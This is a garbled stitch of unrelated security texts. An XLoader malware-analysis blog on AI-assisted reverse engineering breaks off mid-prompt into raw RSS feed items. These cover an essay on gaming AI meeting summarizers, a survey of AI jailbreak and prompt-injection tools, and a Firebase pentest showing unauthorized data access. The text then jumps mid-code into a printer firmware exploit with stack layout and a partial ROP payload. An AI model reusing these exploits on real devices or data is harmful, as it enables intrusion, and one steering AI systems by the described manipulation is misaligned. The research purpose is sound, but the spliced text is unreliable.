XLoader is a widely observed malicious loader with information-stealing capabilities. It first surfaced in 2020 as a rebrand of the FormBook code base, a well-known and capable information stealer, and has since undergone substantial hardening and feature growth. In addition to the Windows variant, its developers also marketed a macOS build, though it appears far less prevalent in the wild.

XLoader is a prime example of malware that is extremely difficult to analyze. It combines several layers of protection: customized encryption with additional mixing steps, encrypted blocks disguised as valid but meaningless assembly code, obfuscated API calls, injections into system processes, and a wide set of sandbox evasion techniques. In addition, XLoader encrypts its network traffic, and hides real C2 addresses among dozens of decoys and fake domains.

An important feature of XLoader is its ongoing development. The authors release new versions regularly, changing internal mechanisms beyond recognition and adding new anti-analysis methods. As a result, previous research quickly becomes outdated. In earlier versions, extracting the configuration required pulling out a few keys using intricate algorithms. At the same time, obtaining the decrypted data only required peeling off two layers of obfuscation and encryption. Version 5 introduced a built-in packer, and in versions 6 and 7 analysts had to work through dozens of chained functions that decrypt each other, extracting intermediate keys at every stage. For someone new to XLoader, the entry barrier has become very high: on top of the analysis itself, extra time is needed for onboarding. By the time one research cycle is completed, the next iteration of the malware may already be out – and if there are significant changes, another time-consuming investigation is required.

When we began this research, XLoader version 8.0 had just been discovered. It seemed the XLoader developers were winning the race. But with the rise of generative models, we asked ourselves: can AI change the rules of the game and help us analyze such complex malware more quickly? To explore this, we applied generative AI assistance in two ways: by directly integrating with our analysis tools through a live MCP connection, and by leveraging ChatGPT’s project and file-upload capabilities to work from exported data. Each approach turned out to have distinct benefits, and together they allow us to solve reverse engineering tasks more effectively.

In this study, we focus on the second approach and show how ChatGPT without MCP can be effectively used for reverse engineering tasks, using one of the latest XLoader samples as an example.

To defend against XLoader, it is critical to extract up-to-date Indicators of Compromise (IoCs) from each new version — real C2 domains and URLs, cryptographic keys, and version identifiers. These IoCs feed into detection signatures and help track active campaigns. The primary way to obtain IoCs is by extracting and decrypting the malware’s configuration data from samples.

The challenge is that XLoader’s constantly shifting tactics break automated extraction tools and scripts almost as soon as they’re developed. The malware authors frequently tweak encryption schemes and packing methods specifically to thwart these efforts. An automated config extractor that worked yesterday might fail today, meaning each major version demands a fresh reverse-engineering cycle.

Sandboxes offer little relief:

In short, a sandbox does not solve the problem. It does not provide a reproducible dump or a complete set of IoCs.

The most reliable method is still static analysis: unpack everything, function by function, decrypt the config, and extract the IoCs. The downside is that doing this manually for each new version is slow and painstaking. This is where we hoped generative AI could act as a force multiplier.

In recent months, many reverse engineers began integrating LLMs with IDA Pro via the Model Context Protocol (MCP) to create an AI-assisted workflow. This agentic approach allows a model to interface directly with the disassembler and debugger, but it has its own practical challenges. For example, some MCP client setups lack certain ChatGPT interface features (like Projects or file uploads), and they still rely on maintaining a live IDA session and stable connection.

We explored two complementary workflows to apply GPT-5 to unraveling XLoader:

Each approach has its own strengths. MCP offers an agentic, interactive workflow, whereas the offline pipeline provides a self-contained analysis that’s easy to share and reproduce. These approaches aren’t mutually exclusive — you can use both, picking the appropriate tool for each task.

The idea of hooking an LLM into IDA isn’t new. For example, researchers at Cisco Talos demonstrated an IDA integration with an LLM acting as a “reverse engineering sidekick”. In our setup, we used MCP to bridge ChatGPT with IDA Pro and also interface with the x64dbg debugger and a VMware virtual machine. This gave LLM a live window into the malware’s execution.

**Figure 1** – Integration of an LLM with the reverse engineering environment through MCP.

This live integration, in addition to static analysis and annotating IDA database, enabled the AI to perform these actions:

However, the MCP approach isn’t without drawbacks:

For many scenarios, these issues are manageable and the benefits of live interaction outweigh the hassles. Some solutions, such as the MCP SuperAssistant browser extension, reduce friction by bringing the ChatGPT interface and MCP connectivity together. Recently, ChatGPT introduced a Developer Mode that can use MCP directly, without third-party plugins. Regardless of whether you use a plugin or the built-in mode, the workflow still depends on a live MCP session tied to a running toolchain and stable connection.

If any of the requirements listed above are difficult to fulfill, for example, you can’t keep IDA running constantly, or you need to easily share analysis progress with a colleague who doesn’t have the same setup, then a different approach might be preferable. That’s why we developed the “offline” data pipeline as an alternative.

Our second approach ditches the live connection entirely. Here AI acts as a self-reliant analyst working from a full static snapshot of the sample.

The workflow is straightforward: we exported everything we could from our IDA Pro database into a structured format (JSON and text). This includes the disassembly and decompiler output of every function, the list of cross-references, the readable strings, and even the original binary itself. We uploaded the .zip file to ChatGPT.

For example, our export bundle included these files:

```
ida_export.zip ├── meta.json # basic info (sample name, hashes, image base, etc.) ├── index.json # lookup tables mapping names/EAs to function indices ├── functions.jsonl # NDJSON: disassembly, xrefs, bytes, prototypes, etc ├── strings.jsonl # list of strings in the binary and their references ├── data.jsonl # globals, arrays, named data references ├── decomp/ # decompiled pseudocode for functions (if available) │ ├── func_or_sub_XXXXXXXX.c │ ├── func_or_sub_YYYYYYYY.c │ └── ... └── sample.bin # the malware sample itself
```

In practice, it is better to upload the archive to a ChatGPT project. Files attached only in the chat can disappear after a session restart, while files in a project stay available for the whole engagement, and can be reused in different chats.

We also wrote an initial prompt explaining how the data is organized and how the AI should format its outputs (for example, proposing new function names and comments in a machine-readable JSON that we could import back into IDA). Essentially, we taught the AI how to read the phonebook we gave it, and how we wanted its notes recorded.

Below is an approximation of our prompt:

````
You are my reverse-engineering copilot. I will upload a ZIP produced by an IDA Pro 9 exporter. It contains: - meta.json - index.json ```json { "by_name": { "]]></content:encoded></item><item><title>Canadian woman stuck since 2021 in Mauritius after passport withheld</title><link>https://databreaches.net/2025/11/03/canadian-woman-stuck-since-2021-in-mauritius-after-passport-withheld/?pk_campaign=feed&amp;pk_kwd=canadian-woman-stuck-since-2021-in-mauritius-after-passport-withheld</link><author>Dissent</author><category>databreach</category><pubDate>Mon, 3 Nov 2025 13:24:21 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Cybercriminals Exploit Remote Monitoring Tools to Infiltrate Logistics and Freight Networks</title><link>https://thehackernews.com/2025/11/cybercriminals-exploit-remote.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjLbX8J0_0T47YXAz7Dd3-oMDVE4jIN0KXLb0QHkdJOWEk1wS2tdrwCXtpfTtDW1YHXbqE2HMyNm4L6QZc3cEKQDnDGBAtiZL6CUlj0G1rGy3-9MFgpov7t3u4CtYJbkk3UDi_05qp5ScoXOKcn3duBXop74yVHiPN2epcn7CpoKQOZjwtVBAjrHj79iPxx/s1600/hacking-trucks.jpg" length="" type=""/><pubDate>Mon, 3 Nov 2025 13:18:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Bad actors are increasingly training their sights on trucking and logistics companies with an aim to infect them with remote monitoring and management (RMM) software for financial gain and ultimately steal cargo freight.

If it becomes necessary to revisit the facts of the meeting, its summary is treated as impartial evidence.But clever meeting attendees can manipulate this system’s record by speaking more to what the underlying AI weights for summarization and importance than to their colleagues. As a result, you can expect some meeting attendees to use language more likely to be captured in summaries, timing their interventions strategically, repeating key points, and employing formulaic phrasing that AI models are more likely to pick up on. Welcome to the world of AI summarization optimization (AISO).Optimizing for algorithmic manipulationAI summarization optimization has a well-known precursor: SEO.Search-engine optimization is as old as the World Wide Web. The idea is straightforward: Search engines scour the internet digesting every possible page, with the goal of serving the best results to every possible query. The objective for a content creator, company, or cause is to optimize for the algorithm search engines have developed to determine their webpage rankings for those queries. That requires writing for two audiences at once: human readers and the search-engine crawlers indexing content. Techniques to do this effectively are passed around like trade secrets, and a $75 billion industry offers SEO services to organizations of all sizes.More recently, researchers have documented techniques for influencing AI responses, including large-language model optimization (LLMO) and generative engine optimization (GEO). Tricks include content optimization—adding citations and statistics—and adversarial approaches: using specially crafted text sequences. These techniques often target sources that LLMs heavily reference, such as Reddit, which is claimed to be cited in 40% of AI-generated responses. The effectiveness and real-world applicability of these methods remains limited and largely experimental, although there is substantial evidence that countries such as Russia are activelypursuingthis.AI summarization optimization follows the same logic on a smaller scale. Human participants in a meeting may want a certain fact highlighted in the record, or their perspective to be reflected as the authoritative one. Rather than persuading colleagues directly, they adapt their speech for the notetaker that will later define the “official” summary. For example:“The main factor in last quarter’s delay was supply chain disruption.”“The key outcome was overwhelmingly positive client feedback.”“Our takeaway here is in alignment moving forward.”“What matters here is the efficiency gains, not the temporary cost overrun.”The techniques are subtle. They employ high-signal phrases such as “key takeaway” and “action item,” keep statements short and clear, and repeat them when possible. They also use contrastive framing (“this, not that”), and speak early in the meeting or at transition points.Once spoken words are transcribed, they enter the model’s input. Cue phrases—and even transcription errors—can steer what makes it into the summary. In many tools, the output format itself is also a signal: Summarizers often offer sections such as “Key Takeaways” or “Action Items,” so language that mirrors those headings is more likely to be included. In effect, well-chosen phrases function as implicit markers that guide the AI toward inclusion.Research confirms this. Early AI summarization research showedthat models trained to reconstruct summary-style sentences systematically overweigh such content. Models over-rely on early-positioncontent in news. And models often overweigh statements at the start or end of a transcript, underweighting the middle. Recent work further confirms vulnerability to phrasing-based manipulation: models cannot reliably distinguish embedded instructions from ordinary content, especially when phrasing mimics salient cues.If AISO becomes common, three forms of defense will emerge. First, meeting participants will exert social pressure on one another. When researchers secretly deployed AI bots in Reddit’s r/changemyview community, users and moderators responded with strong backlash calling it “psychological manipulation.” Anyone using obvious AI-gaming phrases may face similar disapproval.Second, organizations will start governing meeting behavior using AI: risk assessments and access restrictions before the meetings even start, detection of AISO techniques in meetings, and validation and auditing after the meetings.Third, AI summarizers will have their own technical countermeasures. For example, the AI security company CloudSEK recommends content sanitization to strip suspicious inputs, prompt filtering to detect meta-instructions and excessive repetition, context window balancing to weight repeated content less heavily, and user warnings showing content provenance.AI summarization optimization is a small, subtle shift, but it illustrates how the adoption of AI is reshaping human behavior in unexpected ways. The potential implications are quietly profound.Meetings—humanity’s most fundamental collaborative ritual—are being silently reengineered by those who understand the algorithm’s preferences. The articulate are gaining an invisible advantage over the wise. Adversarial thinking is becoming routine, embedded in the most ordinary workplace rituals, and, as AI becomes embedded in organizational life, strategic interactions with AI notetakers and summarizers may soon be a necessary executive skill for navigating corporate culture.AI summarization optimization illustrates how quickly humans adapt communication strategies to new technologies. As AI becomes more embedded in workplace communication, recognizing these emerging patterns may prove increasingly important.This essay was written with Gadi Evron, and originally appeared in CSO.]]></content:encoded></item><item><title>The Evolution of SOC Operations: How Continuous Exposure Management Transforms Security Operations</title><link>https://thehackernews.com/2025/11/the-evolution-of-soc-operations-how.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjUJ9mDhJ4SDGuA35c4k39ETwA8rFT03x3IsKZM37FHB4-uz_qMA4n2BfzZk_8UqkBuL-wA6NWx3i3f3CGin1cIF2JJI6n3xbX1T_FAeMJqkHJXoPVl4OqVgvQ_9OtnEWm8dIpev6_EkLTCpddCzFb4lixW4cfZGES7vhsivpUAFn1pHT6JqilriOZDAIQ/s1600/xmcyber.png" length="" type=""/><pubDate>Mon, 3 Nov 2025 11:56:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Security Operations Centers (SOC) today are overwhelmed.

The Arsenal showcase, a key indicator of technological trends within the Black Hat series, has always been a focal point for security researchers and practitioners to gain insights into future trends. It brings together the world’s most cutting-edge open-source security tools and innovative concepts. This article provides a comprehensive analysis of 8 open-source AI security tools that will be presented at the Black Hat Europe 2025 Arsenal, helping you get an early look at their technical highlights and application scenarios.https://github.com/Tencent/AI-Infra-Guardhttps://github.com/mandiant/harbingerhttps://github.com/stratosphereips/MIPSEvalhttps://github.com/ErdemOzgen/RedAiRangehttps://github.com/ReversecLabs/spikeehttps://github.com/ThalesGroup/sql-data-guardI. The Rise of AI Red Teaming: Platforms, Ranges, and Infrastructure AssessmentAI-powered red team attacks are rapidly evolving from individual techniques into systematic operational capabilities. This conference showcases a “Red Team Trilogy” covering an operational platform, a training range, and a risk self-assessment tool.Harbinger: The AI-Powered Red Team Operations CenterTraditional red team operations are heavily reliant on manual experience, leading to significant efficiency bottlenecks. The “Harbinger” platform, open-sourced by the renowned cybersecurity company Mandiant, aims to address this pain point. It is an AI-driven red team collaboration and decision-making platform with core innovations in:· Operational Automation: Utilizes AI to automatically execute repetitive tasks such as reconnaissance, exploitation, and lateral movement.· Decision Support: Based on the operational landscape, AI can recommend the optimal next attack path to red team members.· Automated Reporting: Automatically organizes attack logs, screenshots, and findings to generate structured attack reports, freeing red team members from tedious documentation work.Connecting the different components of red teaming. This project integrates multiple components commonly used and makes it easier to perform actions, output, and parse.· Socks tasks: Run tools over socks proxies and log the output, as well as templating of commonly used tools.· Neo4j: Use data from neo4j directly into templating of tool commands.· C2 Servers: By default we have support for Mythic. But you can bring your own integration by implementing some code, see the custom connectors documentation.· File parsing: Harbinger can parse a number of file types and import the data into the database. Examples include lsass dumps and ad snapshots. See the parser table for a full list.· Output parsing: Harbinger can detect useful information in output from the C2 and provide you easy access to it.· Data searching: Harbinger gives you the ability to search for data in the database in a number of ways. It combines the data from all your C2s in a single database.· Playbooks: Execute commands in turn in a playbook.· Dark mode: Do I need to say more.· AI integration: Harbinger uses LLMs to analyze data, extract useful information and provide suggestions to the operator for the next steps and acts as an assistant.Harbinger signals a shift in AI red teaming from “using AI tools” to being “driven by an AI platform.”Red AI Range (RAR): The Digital Dojo for AI Offense and DefenseTheoretical knowledge cannot replace hands-on experience. “Red AI Range (RAR),” developed by Sasan Security, provides a much-needed AI security “cyber range” for the industry. It is an AI/ML system environment with pre-configured vulnerabilities, allowing security professionals to:· Practice Real-World Attacks: Engage in hands-on practice of real-world attack techniques such as model evasion, data poisoning, and model stealing.· Validate Defenses: Deploy and test defensive measures against AI threats in a controlled environment.The open-sourcing of RAR significantly lowers the barrier for enterprises and individuals to conduct AI offensive and defensive exercises.A.I.G: The AI Security Risk Self-Assessment PlatformFrom the underlying AI infrastructure to the Agent application layer, Tencent’s Zhuque Lab has open-sourced “A.I.G,” a comprehensive, intelligent, and user-friendly AI red team security testing platform. Unlike Harbinger, it focuses on helping ordinary users quickly assess the security risks of AI systems themselves, providing a very intuitive front-end interface. Its core capabilities include:· AI Infrastructure Scanning: Accurately scans mainstream AI frameworks (like Ollama, ComfyUI) based on fingerprinting and detects known CVE vulnerabilities within them.· MCP Server Scanning: With the explosion in popularity of MCPs, their security has become crucial. A.I.G uses Agent technology to scan MCP Server source code or remote MCP URLs, covering nine major risk categories including tool poisoning, remote code execution, and indirect prompt injection.· Large Model Security Check-up: Includes multiple carefully curated jailbreak evaluation datasets to systematically assess the robustness of LLMs against the latest jailbreak attacks, and supports cross-model security comparison and scoring.A.I.G has the highest number of GitHub Stars (2300+) among all the tools, and its widespread popularity indicates that AI security assessment is becoming democratized. Ordinary AI developers and Agent users also need a platform that can cover the full-stack risk assessment from the underlying infrastructure to the upper-level model applications.II. LLM Prompt Security: From Prompt Injection to Data ProtectionAs LLMs become deeply integrated into business processes, fine-grained security assessment and access control are becoming critically important.SPIKEE & MIPSEval: Evaluating Single-Turn and Multi-Turn LLM SecurityPrompt injection is currently one of the most significant security threats to LLMs. SPIKEE (Simple Prompt Injection Kit for Evaluation and Exploitation), developed by Reversec, provides a lightweight, modular toolkit that allows researchers and developers to quickly test their LLM applications for prompt injection vulnerabilities.However, many security issues only manifest during sustained, multi-turn conversations. The open-source tool MIPSEval fills this gap by being specifically designed to evaluate the security consistency of LLMs in long dialogues. For example, a model might refuse to answer an inappropriate question in the first turn, but after a few rounds of “priming” with unrelated conversation, its safety guardrails could be bypassed. MIPSEval, combined with multiple LLM Agents, provides a framework for evaluating this complex, stateful security.SQL Data Guard: A Secure Channel for LLM Database AccessWhen an LLM needs to connect to an enterprise database to provide services, preventing sensitive data leakage or malicious SQL queries becomes a severe challenge. SQL Data Guard, open-sourced by Thales Group, offers an innovative solution. It acts as a security middleware deployed between the LLM and the database. By analyzing and rewriting the SQL queries generated by the LLM, it ensures that all database interactions comply with preset security policies, thereby effectively controlling risks while empowering the LLM with powerful data capabilities.SQL is the go-to language for performing queries on databases, and for a good reason — it’s well known, easy to use, and pretty simple. However, it seems that it’s as easy to use as it is to exploit, and SQL injection is still one of the most targeted vulnerabilities — especially nowadays with the proliferation of “natural language queries” harnessing Large Language Models (LLMs) power to generate and run SQL queries.To help solve this problem, we developed sql-data-guard, an open-source project designed to verify that SQL queries access only the data they are allowed to. It takes a query and a restriction configuration, and returns whether the query is allowed to run or not. Additionally, it can modify the query to ensure it complies with the restrictions. sql-data-guard has also a built-in module for detection of malicious payloads, allowing it to report on and remove malicious expressions before query execution.sql-data-guard is particularly useful when constructing SQL queries with LLMs, as such queries can’t run as prepared statements. Prepared statements secure a query’s structure, but LLM-generated queries are dynamic and lack this fixed form, increasing SQL injection risk. sql-data-guard mitigates this by inspecting and validating the query’s content.By verifying and modifying queries before they are executed, sql-data-guard helps prevent unauthorized data access and accidental data exposure. Adding sql-data-guard to your application can prevent or minimize data breaches and the impact of SQL injection attacks, ensuring that only permitted data is accessed.Connecting LLMs to SQL databases without strict controls can risk accidental data exposure, as models may generate SQL queries that access sensitive information. OWASP highlights cases of poor sandboxing leading to unauthorized disclosures, emphasizing the need for clear access controls and prompt validation. Businesses should adopt rigorous access restrictions, regular audits, and robust API security, especially to comply with privacy laws and regulations like GDPR and CCPA, which penalize unauthorized data exposure.III. AI-Powered Defense: Automated Threat Modeling and Vulnerability RemediationAI not only introduces new threats but also provides powerful assistance in solving traditional security challenges, especially in terms of scalability and efficiency improvement.Patch Wednesday: AI-Driven Automated Vulnerability RemediationVulnerability remediation is a continuous burden in enterprise security operations. The “Patch Wednesday” project demonstrates how to disrupt this process using generative AI. The core idea of the tool is:· Input: Provide a CVE number and the vulnerable code repository.· Processing: A privately deployed LLM analyzes the CVE description, understands the root cause of the vulnerability, and analyzes it in the context of the code.· Output: Automatically generates a code patch to fix the vulnerability for developers to review and apply.This approach promises to shorten hours or even days of manual remediation work to just a few minutes, dramatically increasing the efficiency of security response.OpenSource Security LLM: Democratizing Threat Modeling CapabilitiesTraditionally, advanced security activities like threat modeling required senior experts. The OpenSource Security LLM project explores how to train and utilize small, open-source LLMs to popularize these capabilities. The presenters will demonstrate how to use these lightweight models to:· Assist in Threat Modeling: Automatically generate potential threat scenarios based on a system description.· Automate Code Review: Analyze code snippets from a security perspective to identify potential vulnerabilities.This foreshadows a future where every developer and security engineer can deploy an “AI Security Assistant” locally, thereby integrating security capabilities more broadly into the early stages of the development lifecycle.IV. Conclusion and Outlook: Towards a Mature AI Security EcosystemThe eight tools showcased at the Black Hat Europe 2025 Arsenal clearly delineate the future trends of AI security tools. From systematic red team attack platforms to fine-grained LLM governance tools, and AI-powered automated defense solutions, traditional security tools are being comprehensively reshaped and accelerated towards maturity by AI:Systematization of AI Red Teaming and Attack Simulation: Attack tools are evolving from single-function utilities to platform-based, automated, and intelligent systems, with corresponding cyber ranges for adversarial simulation also emerging.Refinement of LLM Security and Governance: Assessment and defense tools for prompt injection, data security, and multi-turn conversational safety are becoming more mature, forming a critical part of governance.Automation of AI-Powered Defense: AI is being deeply integrated into traditional security processes like vulnerability management and threat modeling to enhance efficiency and scalability.Just like open-source large models, open-source AI security tools will become a core driving force for innovation in the security industry. The tools featured at Black Hat will greatly promote the dissemination and iteration of cutting-edge technologies. For all security practitioners, now is a critical moment not only to learn how to “;defend against AI” but also to learn how to “leverage AI” to revolutionize existing security practices. This new arms race centered around artificial intelligence has only just begun.https://www.blackhat.com/eu-25/arsenal/schedule/index.html#track/ai-ml--data-science]]></content:encoded></item><item><title>Quick writeup for what to check when you see Firebase in a pentest</title><link>https://projectblack.io/blog/firebase-security-fundamentals/</link><author>/u/ezzzzz</author><category>netsec</category><pubDate>Mon, 3 Nov 2025 09:04:37 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[If you’re a new developer building your first Firebase app and thinking about security or you're a penetration tester who’s come across a Firebase application during an engagement, this article is for you.Firebase is a group of cloud based services offered by Google. Most people describe the platform as a Backend as a service.In a traditional web application, your backend server enforces access control. For example, in a to-do app  you may want to prevent users from reading other people's to-do items, the backend code might perform a check to make sure that the requested  actually belongs to the requesting user:@app.route('/todo/<todo_id>')
def get_todo(todo_id):
    todo = get_todo_by_id(todo_id)

    if not todo:
        abort(404, "Todo not found.")

    # Authorisation check: only allow access if the todo belongs to the user
    if str(todo.user_id) != str(request.user.id):
        abort(403, "You are not authorised to access this todo item.")

    return jsonify(todo)With Firebase, there isn’t a traditional backend server. Instead, the database is exposed directly to the client, and access control must be enforced through  rather than server-side code.This needs to be tailored to what application use cases you need to support but generally speaking here are some sane defaults to consider:Users should not be able to list all documents in a collection (database table)This is akin to restricting users from performing a  queryA list operation retrieves all documents in a collection along with the  for each documentFor a given , users should only be able to get, update, replace, or delete records that belong to themself!If you're a penetration tester these are test cases you want to consider checking.Here's what can happen if you don't implement any security rules.Let's take a look at our victim - a classic todo list app. You login, and the app lets you add and remove your own todo lists items. Although the frontend does not provide any buttons to interact with anyone else's Todo list items, we can connect directly to underlying Firebase data store using the same SDK to try perform these actions.In all Firebase apps, the  required by the Firebase SDK needs to be exposed.If you search for  or  in the Browser dev tools you'll normally find the details we need to connect directly.It might look alarming that an  is exposed but in Firebase projects this is expected."None of the Firebase-related APIs use an API key as  for calling the API. The API key passed with the API call is only used for  of the Firebase project or app."We can use firepwn to exploit the lack of security rules. This is a project that Project Black has contributed to.Intialise the configuration as follows (the parameters look a bit different because the tool uses the  SDK).To find collection names to query we can search the Frontend code again for  or alternatively inspect network traffic when using the app.After logging in, we can perform a  operation by performing a  without specifying a .In this case, we're able to retrieve todo list items created by other users!Overwriting/updating our victim's todo item is as simple as changing the operation to  and specifying a  to update.Firebase storage is secured the same way with security rules. In the absence of any security rules you're similarly able to retrieve all files stored in the storage and overwrite them as desired.Implementing Security RulesTo fix our broken access control issue the solution is to check that the userId from authentication matches the userId stored in the document.request.auth.uid == resource.data.userIdTo support rule, our todo list items also need to have an associated userId stored in the document.rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /todos/{todoId} {
      // Allow users to read and write only their own todos
      allow read, write: if request.auth != null \
        && request.auth.uid == resource.data.userId;
      // Allow creating todos if authenticated, only allow creating todos
      // owned by the authenticated user
      allow create: if request.auth != null \
        %& request.auth.uid == request.resource.data.userId;

```

**Key Discovery:** The three zlib components (zlibRo, zlibRw, and zlib2Rw) are concatenated together and can be extracted sequentially using Python’s zlib library.

### Part 3: Loading the Firmware into IDA Pro

Now comes the fun part: reverse engineering the actual code. We loaded the extracted segments into IDA Pro for analysis.

#### Step 1: Load the Kernel Segment

Start by loading `flash_V1.14_KernelRoSrcAdr_0x40419000_0x22a8c.bin`. Critical detail: **select ARM Little-endian processor type**.

#### Step 2: Configure Memory Layout

Set both the ROM start address and loading address to match the KernelRo address (conveniently also included in the filename: `0x40419000`).

Add a RAM section at address `0x42DA0000` (derived from RamHighAdr in the firmware), with a size of `0x100000`. This might not be 100% accurate, but it’s a reasonable starting point.

#### Step 3: Disassemble

Choose 32-bit code when prompted:

#### Step 4: Load Additional Segments

With the initial file loaded, add the remaining segments via **File → Load File → Additional binary file…**

**Important:** Ensure you’re specifying the **Loading address** field, not “Loading segment” (which uses a different address type).

#### Step 5: Set Segment Permissions

After adding each segment, verify that permissions are correctly set:

- **Read-only segments (Ro)**: Mark as RX (Read + Execute)
- **Read-write segments (Rw)**: Mark as RWX (Read + Write + Execute)

This ensures IDA properly analyzes the different code sections.

#### Step 6: Complete the Memory Map

Repeat for all remaining sections. Your final memory map should look like this with 6 segments:

#### Step 7: Reanalyze

Once all segments are loaded, reanalyze the program:

- Option 1: Use the bottom-right hidden menu
- Option 2: Navigate to **Options → General → Analysis → Reanalyze Program**

Also run the built-in IDA **Find Functions** plugin to identify function boundaries:

### Part 4: Finding the Vulnerability

Now that we have the firmware properly loaded, we can start hunting for interesting functions. Our initial approach was to:

1. Map out the HTTP request handling code
2. Identify input validation routines
3. Look for unsafe string operations

As part of our exploitation chain, we drew inspiration from Rapid7’s CVE-2024-51979: stack based buffer overflow in the validation logic for the CSRFToken header.

#### The Vulnerable Code

Here’s the minimal vulnerable code path:

```
int __fastcall decode_csrftoken(int http_req, char *b64_token) { ... v26 = extract_header_value(http_req, "Referer", v37, 2048) + 1; // Extract Referer header ... v34 = strstr(v37, "//"); strcpy(v48, (v34 + 2)); r6_42 = strstr(v48, "/"); memset(buff64, 0, sizeof(buff64)); memcpy(buff64, v48, r6_42 - v48); // ← BUFFER OVERFLOW HERE v33 = buff64; ... }
```

**The Bug:** If the `Referer` header contains `http://AAA...AAA/boc/boc.html`, the `AAA...AAA` portion is copied into `buff64` without bounds checking. By sending a Referer header with more than 256 ‘A’ characters, we overflow the buffer.

#### Understanding the Call Stack

When execution reaches this vulnerable code, the call stack looks like:

```
handle_http_request (0x40D365D4) └─ decode_params (0x408F4F8A) └─ decode_csrftoken (0x40CAC154) ← Overflow happens here
```

##### The Stack Layout

Here’s what the stack looks like when we trigger the overflow:

```
Higher addresses │ ┌───────────────────────────────────────────────┐ │ │ Frame #1 (decode_csrftoken) │ │ ├───────────────────────────────────────────────┤ | │ .... │ | │ PADDING_BUFFER | | | (0xd4 bytes from overflown buffer) │ | │ .... │ | ├───────────────────────────────────────────────┤ │ SP_after_f1 → │ saved R4 │ │ ├───────────────────────────────────────────────┤ │ │ saved R5 │ │ ├───────────────────────────────────────────────┤ │ │ saved R6 │ │ ├───────────────────────────────────────────────┤ │ │ saved R7 │ │ ├───────────────────────────────────────────────┤ │ │ saved R8 │ │ ├───────────────────────────────────────────────┤ │ │ saved R9 ← [1] callback pointer │ │ ├───────────────────────────────────────────────┤ │ │ saved R10 │ │ ├───────────────────────────────────────────────┤ │ │ saved R11 │ │ ├───────────────────────────────────────────────┤ │ │ saved R12 │ │ ├───────────────────────────────────────────────┤ │ │ saved PC │ │ └───────────────────────────────────────────────┘ │ ┌───────────────────────────────────────────────┐ │ │ Frame #2 (decode_params) │ │ ├───────────────────────────────────────────────┤ | │ .... │ | │ PADDING_BUFFER (0x80 bytes) │ | │ .... │ | ├───────────────────────────────────────────────┤ │ SP_after_f2 → │ saved R4 │ │ ├───────────────────────────────────────────────┤ │ │ saved R5 │ │ ├───────────────────────────────────────────────┤ │ │ saved R6 ← [2] first argument │ │ ├───────────────────────────────────────────────┤ │ │ saved R7 │ │ ├───────────────────────────────────────────────┤ │ │ saved R8 │ │ ├───────────────────────────────────────────────┤ │ │ saved PC │ │ └───────────────────────────────────────────────┘ │ Lower addresses
```

#### The Exploitation Strategy

When parameter decoding fails in `decode_params`, the code executes a callback function to return an error. The callback pointer is stored in `R9` of the `decode_csrftoken` stack frame (marked \[1\] above), and the first argument is in `R6` of the `decode_params` stack frame (marked \[2\]).

Here’s the relevant code in `handle_http_request`:

```
int __fastcall handle_http_request( _DWORD *http_req, void (__fastcall *callback)(int, int, int, int, int, char *), char *a3, char *a4, int a5) { sub_40D50B14(); sub_408F46FA(http_req, v9, v10, v11); if ( sub_40D3655E(http_req, v12, v13, v14) ) return 0; decode_params(v28, http_req, v15, v16); // ← Calling decode_params sub_409A15B0(&v26, v28, 0xCu, v17); if ( !sub_40D363C0(http_req) ) { sub_40D364DC(http_req); if ( !v19 ) { sub_40D32FDE(http_req, "X-Frame-Options", "DENY"); if ( !a3 ) a3 = ""; sub_408F2840(http_req, a3, a4, v20); sub_408F2F48(http_req, a5); sub_409A15B0(v25, v27, 8u, v21); executeCallback(http_req, callback, a5, v26, v25[0], v25[1]); // ← Execute callback sub_408F29D6(http_req, v22, v23, v24); } } sub_408F5180(v26, *v27, *&v27[4], v28); return 0; } int __fastcall executeCallback( int r0_0, int (__fastcall *callback)(int, int, int, int, int, void *), int a3, int a4, int a5, int a6) { if ( sub_408F27C4(r0_0, a1) == -1 ) print_input_perhaps(a1, "ERROR\n", v10); sub_40D59E04(v13, 256, "", a1); sub_408F5236(r0_0, v13); v11 = callback(r0_0, a4, a5, a6, a3, &unk_408F3084); // ← Executing callback sub_408F5236(r0_0, ""); return v11; }
```

**Our exploit strategy:**

1. Overflow the buffer to overwrite the `callback` pointer with our target function address
2. Control the first argument to that function
3. Execute arbitrary code

### Part 5: Crafting the Exploit

For our proof of concept, we wanted to display text on the printer’s LCD screen. Through reverse engineering, we found a perfect function at address `0x4054B380`:

```
int __fastcall display_wrapper_a1_30s(char *stringToDisplay) { _BYTE v3[4]; // [sp+10h] [bp-Ch] BYREF _BYTE v4[8]; // [sp+14h] [bp-8h] BYREF sub_4047DCCE(0, 0, 160, 128, 0, 0, 0); sub_4047E040(v3, 255, 255); sub_4047E040(v4, 255, 0); stringToDisplay[16] = 0; display_something(0, 0, stringToDisplay, 1, 0, v3, v4, 160); return sub_40969246(); }
```

This function:

- Takes a string as its first argument (which we control via `R6`)
- Displays it on the printer’s LCD
- Has a 16-character limit (perfect for fitting our text **)**) `STAR LABS!`

### The Final Exploit Payload

```
#!/usr/bin/env python3 from urllib.parse import quote, unquote from pwn import * session = requests.Session() session.verify = False buffer_ = flat( { # Pops at the end of decode_csrf # 40CAC508 BD E8 F0 9F POP.W {R4-R12,PC} 212: [ # Returns from decode_csrf # zlibRo:40CAC508 BD E8 F0 9F POP.W {R4-R12,PC} 0x62626262, # R4 0x62626262, # R5 0x62626262, # R6 0x62626262, # R7 0x402B866C, # R8 / R0 at 408F5140: IMPORTANT, maybe HTTP struct?

```

### The Result

When we send this crafted HTTP request with the malicious Referer header, the printer displays our message:

**Success!** We’ve achieved arbitrary code execution on a network-connected printer without any authentication.

## Impact Assessment

### What Could an Attacker Actually Do?

While our proof of concept just displays a message, a real attacker could do lots more.

### For Users

1. **Update firmware immediately** to version 1.19 or later (if available)
2. **Disable SNMP** if not needed: Access printer settings → Network → SNMP → Disable
3. **Change default password** to a strong, unique password
